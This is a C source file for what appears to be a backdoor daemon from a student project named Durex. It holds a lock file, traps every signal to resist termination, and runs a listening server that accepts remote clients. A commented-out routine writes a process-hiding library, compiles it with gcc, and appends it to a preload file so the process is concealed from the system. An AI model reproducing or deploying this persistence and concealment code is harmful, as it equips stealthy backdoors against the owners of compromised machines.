/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
/*   Updated: 2018/08/13 00:42:00 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* signal */
#include <signal.h>
/* remove */
#include <stdio.h>
/* exit */
#include <stdlib.h>
/* open */
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
/* getpwuid */
#include <sys/types.h>
#include <pwd.h>
/* time */
#include <time.h>

#include "main.h"
#include "durex.h"

static void			cleanEnvironement()
{
	e.lock = -1;
	e.server.reporter = -1;
	e.server.fd = -1;
	memset(&e.server.fdr, 0, sizeof(e.server.fdr));
	memset(&e.server.fdw, 0, sizeof(e.server.fdw));
	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
		clearClient(&e.server.client[i]);
}

static int			launch_program()
{
	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_WRONLY, 0600);
	if (e.lock < 0)
		return 0;
	if (flock(e.lock, LOCK_EX | LOCK_NB))
		return 0;
	for (int i = 0; i < NSIG; i++) {
		signal(i, &durexSigterm);
	}
	return 1;
}

static int			hireReporter()
{
	return open(SERVER_REPORTER, O_CREAT | O_TRUNC | O_RDWR, 0600);
}

static int			setupSelect()
{
	int				i;
	int				max;

	FD_ZERO(&e.server.fdr);
	FD_ZERO(&e.server.fdw);
	FD_SET(e.server.fd, &e.server.fdr);
	max = e.server.fd;
	i = 0;
	while (i < SERVER_CLIENT_MAX)
	{
		if (e.server.client[i].fd > max)
			max = e.server.client[i].fd;
		if (e.server.client[i].fd != -1) {
			FD_SET(e.server.client[i].fd, &e.server.fdr);
			FD_SET(e.server.client[i].fd, &e.server.fdw);
		}
		i++;
	}
	return max;
}

/* static void		check_hide_binary() */
/* { */
/* 	static time_t		t = 0; */
/* 	struct stat	s; */
/* 	int			fd; */
/* 	size_t		ret; */
/* 	FILE		*f; */
/* 	char		*line; */

/* 	if (time(NULL) - t > DUREX_PROCESSHIDER_CHECK_TIME) { */
/* 		t = time(NULL); */
/* 		if (stat(DUREX_PROCESSHIDER_LIB, &s) < 0) { */
/* 			serverLog(e.server.reporter, DUREX_PROCESSHIDER_LIB" not present. Recreating it..."); */
/* 			fd = open(DUREX_PROCESSHIDER_FIL, O_CREAT | O_TRUNC | O_WRONLY, 0644); */
/* 			if (fd < 0) */
/* 				return ; */
/* 			ret = write(fd, DUREX_PROCESSHIDER_SCR, sizeof(DUREX_PROCESSHIDER_SCR) - 1); */
/* 			close(fd); */
/* 			if (ret != sizeof(DUREX_PROCESSHIDER_SCR) - 1) { */
/* 				remove(DUREX_PROCESSHIDER_FIL); */
/* 				return ; */
/* 			} */
/* 			system("gcc -Wall -fPIC -shared -o "DUREX_PROCESSHIDER_LIB" "DUREX_PROCESSHIDER_FIL" -ldl"); */
/* 			remove(DUREX_PROCESSHIDER_FIL); */
/* 		} */
/* 		f = fopen(DUREX_PRELOAD, "a+"); */
/* 		if (f == NULL) */
/* 			return ; */
/* 		while (1) { */
/* 			line = NULL; */
/* 			ret = 0; */
/* 			ssize_t ret2 = getline(&line, &ret, f); */
/* 			if (ret2 <= 0) */
/* 				break ; */
/* 			if (strstr(line, DUREX_PROCESSHIDER_LIB)) */
/* 				return ; // lib in file, all OK ! */
/* 			free(line); */
/* 		} */
/* 		serverLog(e.server.reporter, DUREX_PROCESSHIDER_LIB" not present in "DUREX_PRELOAD". Fixing it!"); */
/* 		fwrite(DUREX_PROCESSHIDER_LIB, 1, sizeof(DUREX_PROCESSHIDER_LIB), f); */
/* 		fwrite("\n", 1, 1, f); */
/* 		fclose(f); */
/* 	} */
/* } */

void				durex()
{
	int				maxfd;
	int				ret;
	struct timeval	timeout;

	cleanEnvironement();
	if (launch_program()) {
		e.server.reporter = hireReporter();
		serverLog(e.server.reporter, "Reporter Hired.");
		e.server.fd = openServer(SERVER_ADDR, SERVER_PORT);
		serverLog(e.server.reporter, "Server Opened.");
		memset(&timeout, 0, sizeof(timeout));
		while (1)
		{
			maxfd = setupSelect();
			ret = select(maxfd + 1, &e.server.fdr, &e.server.fdw, NULL, &timeout);
			if (ret == -1)
				break ;
			if (FD_ISSET(e.server.fd, &e.server.fdr))
				serverAcceptConnections();
			for (int i = 0; i < SERVER_CLIENT_MAX; i++)
			{
				if (e.server.client[i].fd == -1)
					continue ;
				if (FD_ISSET(e.server.client[i].fd, &e.server.fdr))
					serverReadClient(&e.server.client[i]);
				if (FD_ISSET(e.server.client[i].fd, &e.server.fdw))
					serverWriteClient(&e.server.client[i]);
			}
//			check_hide_binary();
		}
		quitClearlyServer();
		quitClearlyDaemon();
	}
	struct passwd	*passwd;
	passwd = getpwuid(getuid());
	write(STDIN_FILENO, passwd->pw_name, strlen(passwd->pw_name));
	write(STDIN_FILENO, "\n", 1);
}

void			quitClearlyDaemon()
{
	flock(e.lock, LOCK_UN);
	close(e.lock);
	remove(DUREX_LOCK_FILE);
	exit(0);
}
